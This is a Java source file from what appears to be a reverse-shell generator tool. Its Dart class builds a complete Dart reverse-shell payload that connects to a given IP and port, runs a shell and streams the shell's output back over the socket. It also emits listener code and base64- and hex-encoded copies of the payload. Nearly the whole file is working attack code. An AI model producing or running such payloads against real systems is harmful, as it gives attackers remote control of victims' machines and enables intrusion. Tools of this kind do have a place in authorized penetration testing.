package com.iteso.ReverseShellGenerator.Reverse.Shells;
import com.iteso.ReverseShellGenerator.DEncoder;
import com.iteso.ReverseShellGenerator.Reverse.Reverse;

public class Dart extends Reverse {

    protected String shellFormat = "";

    public Dart(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("import 'dart:io';\nimport 'dart:convert';\n\nmain() {\n  Socket.connect(\"%s\", %s).then((socket) {\n    socket.listen((data) {\n      Process.start('%s', []).then((Process process) {\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout\n          .transform(utf8.decoder)\n          .listen((output) { socket.write(output); });\n      });\n    },\n    onDone: () {\n      socket.destroy();\n    });\n  });\n}", this.getLocalIP(), this.getLocalPort(), this.getShell());
    }

    @Override
    public String getShellCode(){
        return shellFormat;
    }

    @Override
    public String toString(){
        return "{" + "\"parameters\": " + super.toString() + "," +
                    "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                    "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                    "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                    "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                "}";
    }
 
}